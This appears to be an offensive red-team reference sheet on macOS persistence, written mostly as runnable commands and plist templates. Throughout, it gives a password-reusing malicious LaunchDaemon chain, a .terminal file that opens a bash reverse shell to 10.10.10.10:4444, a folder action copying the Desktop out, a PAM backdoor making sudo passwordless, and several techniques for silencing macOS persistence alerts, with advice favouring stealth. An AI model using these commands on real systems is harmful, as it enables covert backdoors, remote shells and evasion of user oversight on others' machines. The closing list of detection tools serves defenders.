# Persistence & Auto-Start Reference

## LaunchAgents / LaunchDaemons

**launchd** is PID 1. It reads plists from ASEP directories and executes them at boot or login.

### Paths

| Path | Scope | Root Required | Trigger |
|------|-------|---------------|---------|
| `/System/Library/LaunchDaemons/` | System daemons (Apple) | Yes (SIP) | Boot |
| `/System/Library/LaunchAgents/` | Per-user agents (Apple) | Yes (SIP) | Login |
| `/Library/LaunchDaemons/` | System daemons (admin) | Yes | Boot |
| `/Library/LaunchAgents/` | Per-user agents (admin) | Yes | Login |
| `~/Library/LaunchAgents/` | Current user agents | No | Login |
| `~/Library/LaunchDaemons/` | Current user daemons | No | Login |

**Key difference:** Daemons load at system startup (before login). Agents load when a user logs in and may use GUI.

### Plist Template

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.example.persist</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>touch /tmp/persistence_confirmed</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>StartInterval</key>
        <integer>60</integer>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/>
    </dict>
</dict>
</plist>
```

### Loading Commands

```bash
# Load (new persistence, triggers BTM alert)
launchctl load ~/Library/LaunchAgents/com.example.persist.plist

# Load even without extension
launchctl -F <file>

# Force load (override disabled state)
sudo launchctl load -w /Library/LaunchDaemons/com.example.persist.plist

# Unload
launchctl unload ~/Library/LaunchAgents/com.example.persist.plist

# List all loaded agents/daemons
launchctl list
```

### Ownership Caveat

If a plist in a system-wide daemon folder is owned by a non-root user, the task executes as that user, not root. Always `chown root:wheel` for root-level LaunchDaemons.

### Example: Malicious LaunchDaemon Chain (Password Reuse)

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```

## Shell Startup Files

Sandbox bypass: yes. TCC bypass: possible if a TCC-privileged app spawns a shell.

### Zsh (default shell since Catalina)

| File | Trigger | Scope |
|------|---------|-------|
| `/etc/zshenv` | Every zsh invocation | System (root) |
| `~/.zshenv` | Every zsh invocation | User |
| `/etc/zprofile` | Login shells | System (root) |
| `~/.zprofile` | Login shells | User |
| `/etc/zshrc` | Interactive shells | System (root) |
| `~/.zshrc` | Interactive shells | User |
| `/etc/zlogin` | Login shells (after zshrc) | System (root) |
| `~/.zlogin` | Login shells (after zshrc) | User |
| `~/.zlogout` / `/etc/zlogout` | Shell exit | User / System |

**Execution order (login shell):** zshenv -> zprofile -> zshrc -> zlogin

### Bash

| File | Trigger |
|------|---------|
| `~/.bashrc` | Interactive non-login bash |
| `~/.bash_profile` | Login bash |
| `/etc/profile` | Login bash (system) |

### Exploitation

```bash
echo 'touch /tmp/shell_persist' >> ~/.zshenv   # Fires on ANY zsh invocation
echo 'nohup /tmp/payload &' >> ~/.zshrc        # Fires on interactive terminal open
```

**Note:** `~/.zshenv` is the most reliable -- it runs for every zsh process, including non-interactive ones.

## Login Items & Open at Login

### Via System Events (osascript)

```bash
# List login items
osascript -e 'tell application "System Events" to get the name of every login item'

# Add login item
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/app", hidden:false}'

# Remove login item
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

Storage: `~/Library/Application Support/com.apple.backgroundtaskmanagementagent`

### Via SMLoginItemSetEnabled (API)

Config stored in `/var/db/com.apple.xpc.launchd/loginitems.501.plist` (root required).

### Re-opened Applications

Apps that reopen after reboot are stored in:
`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

```bash
# Get UUID
ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'

# List re-opened apps
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin

# Add app to reopen list
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:\$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:\$:BundleID com.example.app" \
    -c "Set :TALAppsToRelaunchAtLogin:\$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:\$:Path /Applications/Example.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### ZIP as Login Item Trick

Store a ZIP as a Login Item. `Archive Utility` auto-extracts it. If the ZIP contains `LaunchAgents/file.plist`, extraction into `~/Library/` creates the persistence directory and plist automatically. Also works with `.bash_profile` or `.zshenv` inside the ZIP.

### Login/Logout Hooks (deprecated, may still work)

```bash
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
# Stored in: ~/Library/Preferences/com.apple.loginwindow.plist
# Root hooks: /private/var/root/Library/Preferences/com.apple.loginwindow.plist
defaults delete com.apple.loginwindow LoginHook  # Remove
```

## Folder Actions

Scripts auto-triggered by folder changes (add/remove items, open folder window).

### Locations

- `/Library/Scripts/Folder Action Scripts` (root required)
- `~/Library/Scripts/Folder Action Scripts`

### Setup via OSAScript (programmatic persistence)

```bash
# 1. Write the action script
cat > /tmp/source.js << 'EOF'
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("cp -R ~/Desktop /tmp/exfil");
EOF

# 2. Compile it
osacompile -l JavaScript -o folder.scpt /tmp/source.js

# 3. Install it
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv folder.scpt "$HOME/Library/Scripts/Folder Action Scripts/"

# 4. Attach to target folder via JXA
cat > /tmp/attach.js << 'EOF'
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "folder.scpt", posixPath: "$HOME/Library/Scripts/Folder Action Scripts/folder.scpt" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
EOF
osascript -l JavaScript /tmp/attach.js
```

Config stored in: `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`

## Cron & At Jobs

### Cron

```bash
# List current user cron jobs
crontab -l

# All user crontabs (root)
ls -lR /usr/lib/cron/tabs/ /var/at/tabs/

# Install a cron job
echo '* * * * * /bin/bash -c "touch /tmp/cron_persist"' > /tmp/cron
crontab /tmp/cron
```

**Note:** Cron jobs trigger BTM alerts on modern macOS. Prefer LaunchAgents for stealth.

### At Jobs

Disabled by default. Must be enabled as root:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

```bash
# Schedule command for 1 minute from now
echo "echo pwned > /tmp/at.txt" | at now+1

# List queued jobs
atq

# Inspect job details
at -c <JOBNUMBER>
```

Job files: `/private/var/at/jobs/`. Tasks persist across reboots and auto-remove after execution.

### Periodic Scripts

Scripts in `/etc/periodic/daily|weekly|monthly/` run via LaunchDaemons as file owner.

```bash
ls -lR /etc/periodic/
# Additional local scripts:
# /etc/daily.local, /etc/weekly.local, /etc/monthly.local
```

Root required to write. Execution delay: up to 24h (daily), 7d (weekly), 30d (monthly).

## Other Persistence Locations

### Terminal Preferences

```bash
# Inject startup command into Terminal.app profile
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal_persist'" \
    $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" \
    $HOME/Library/Preferences/com.apple.Terminal.plist
```

Terminal has FDA permissions of the invoking user -- TCC bypass potential.

### .terminal / .command / .tool Files

Any `.terminal` file opened triggers Terminal.app to execute its `CommandString`:

```bash
cat > /tmp/test.terminal << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>bash -i >& /dev/tcp/10.10.10.10/4444 0>&1</string>
    <key>ProfileCurrentVersion</key><real>2.06</real>
    <key>RunCommandAsShell</key><false/>
    <key>name</key><string>exploit</string>
    <key>type</key><string>Window Settings</string>
</dict>
</plist>
EOF
open /tmp/test.terminal
```

`.command` and `.tool` files with shell content also auto-open in Terminal.

### iTerm2

```bash
# AutoLaunch scripts (executed when iTerm2 opens)
mkdir -p "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch"
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << 'EOF'
#!/bin/bash
touch /tmp/iterm2-persist
EOF
chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"

# Or inject via preferences
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-cmd'" \
    $HOME/Library/Preferences/com.googlecode.iterm2.plist
```

iTerm2 often has TCC grants (Accessibility, FDA). No sandbox.

### Hammerspoon

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << 'EOF'
hs.execute("touch /tmp/hammerspoon_persist")
EOF
```

Requires Hammerspoon installed. It typically has Accessibility permissions.

### SSH rc Files

```bash
# User-level (no root needed)
echo 'touch /tmp/ssh_persist' >> ~/.ssh/rc

# System-level (root)
echo 'touch /tmp/ssh_persist' >> /etc/ssh/sshrc
```

Disabled by `PermitUserRC no` in `/etc/ssh/sshd_config`. SSH typically has FDA.

### Dock Shortcuts

```bash
# Add malicious app to Dock
defaults write com.apple.dock persistent-apps -array-add \
    '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Fake.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### QuickLook Generators

Paths: `~/Library/QuickLook/`, `/Library/QuickLook/`, app-embedded `Contents/Library/QuickLook/`
Trigger: User presses spacebar on a file in Finder.

### Spotlight Importers

Paths: `~/Library/Spotlight/`, `/Library/Spotlight/`
Trigger: New file created with matching extension. Loaded within ~1 minute.

```bash
mdimport -L   # List loaded importers
```

### Audio Plugins

Paths: `/Library/Audio/Plug-Ins/HAL`, `~/Library/Audio/Plug-ins/Components`
Trigger: coreaudiod restart or reboot.

### Color Pickers

Paths: `~/Library/ColorPickers/`, `/Library/ColorPickers/`
Trigger: User opens color picker dialog. Runs in restricted sandbox.

### Authorization Plugins

```bash
# Install plugin (root)
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/

# Register in authorization DB
security authorizationdb write com.asdf.asdf < /tmp/rule.plist
security authorize com.asdf.asdf  # Trigger
```

### PAM Backdoor

```bash
# Prepend to /etc/pam.d/sudo (root required, TCC protected)
# After this, sudo requires no password
auth       sufficient     pam_permit.so
```

### Man.conf

```bash
# /private/etc/man.conf -- set MANPAGER to payload wrapper
echo 'MANPAGER /tmp/view' >> /private/etc/man.conf
# /tmp/view executes payload then calls /usr/bin/less -s
```

## Kernel Extensions (Persistence Angle)

KEXT installation is extremely difficult on modern macOS (requires disabling SIP, user approval, reboot).

```bash
# Paths
/System/Library/Extensions    # Apple KEXTs (SIP protected)
/Library/Extensions           # Third-party KEXTs

# Commands
kextstat                              # List loaded KEXTs
kextload /path/to/kext.kext           # Load
kextunload /path/to/kext.kext         # Unload
kextload -b com.apple.driver.Example  # Load by bundle ID
```

Not practical for persistence unless an exploit chain disables SIP first.

## Background Task Management (BTM)

macOS alerts users when new persistence is detected in known locations.

### Architecture

- **Daemon:** `/System/Library/PrivateFrameworks/BackgroundTaskManagement.framework/Versions/A/Resources/backgroundtaskmanagementd`
- **Agent:** `BackgroundTaskManagementAgent.app` (shows user notifications)
- **Database:** `/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v4.btm`
- **Known apps whitelist:** `BackgroundTaskManagement.framework/.../attributions.plist`
- **Detection method:** FSEvents monitoring on persistence directories

### Enumeration

```bash
sfltool dumpbtm            # Apple tool (prompts for password)
./dumpBTM                  # github.com/objective-see/DumpBTM (needs FDA)
```

### Bypass Techniques

**1. Database Reset (root required)**
```bash
sfltool resettbtm
# After reset, no new persistence alerts until reboot
```

**2. SIGSTOP the Agent**
```bash
pgrep BackgroundTaskManagementAgent   # Get PID
kill -SIGSTOP <PID>                   # Suspend (T state)
# Agent is alive but won't deliver notifications
ps -o state <PID>                     # Verify: shows "T"
```

**3. Fast-Exit Bug**
If the process that creates the persistence entry exits immediately after, the daemon fails to gather process info and silently drops the event. No notification is sent.

**4. Event type to block:** `ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM_ADD`

## Persistence Location Summary Table

| Location | Root? | Survives Reboot? | Sandbox Bypass? | TCC Bypass? |
|----------|-------|-------------------|-----------------|-------------|
| `/Library/LaunchDaemons/` | Yes | Yes | Yes | No |
| `/Library/LaunchAgents/` | Yes | Yes | Yes | No |
| `~/Library/LaunchAgents/` | No | Yes | Yes | No |
| `~/.zshenv` / `~/.zshrc` | No | Yes | Yes | Conditional |
| `~/.zprofile` / `~/.zlogin` | No | Yes | Yes | Conditional |
| `/etc/zshenv` / `/etc/zshrc` | Yes | Yes | Yes | Conditional |
| Login Items (osascript) | No | Yes | Yes | No |
| Re-opened Apps plist | No | Yes | Yes | No |
| Folder Actions | No | Yes | Yes | Partial |
| Cron (`crontab`) | No | Yes | Yes | No |
| At jobs | No | Yes (one-shot) | Yes | No |
| Periodic scripts | Yes | Yes | Yes | No |
| Terminal preferences | No | Yes | Yes | Yes (FDA) |
| `.terminal` / `.command` files | No | No (manual) | Yes | Yes (FDA) |
| iTerm2 AutoLaunch | No | Yes | Yes | Yes |
| Hammerspoon `init.lua` | No | Yes | Yes | Yes |
| `~/.ssh/rc` | No | Yes | Yes | Yes (FDA) |
| Dock shortcuts | No | Yes | Yes | No |
| QuickLook plugins | No | Yes | Yes | Partial |
| Spotlight importers | No | Yes | Partial | No |
| Audio plugins | Yes | Yes | Yes | Partial |
| Authorization plugins | Yes | Yes | Partial | Unknown |
| PAM modules (`/etc/pam.d/`) | Yes | Yes | Partial | No |
| KEXTs (`/Library/Extensions/`) | Yes | Yes | N/A | N/A |
| Screen Savers | No | Yes | Partial | No |
| Color Pickers | No | Yes | Partial | No |

## Tools

- [Persistent-Swift](https://github.com/cedowens/Persistent-Swift) -- Swift persistence installer
- [PersistentJXA](https://github.com/D00MFist/PersistentJXA) -- JXA-based persistence
- [DumpBTM](https://github.com/objective-see/DumpBTM) -- Enumerate BTM database
- [KnockKnock](https://objective-see.org/products/knockknock.html) -- Scan all persistence locations
- [BlockBlock](https://objective-see.org/products/blockblock.html) -- Real-time persistence monitoring
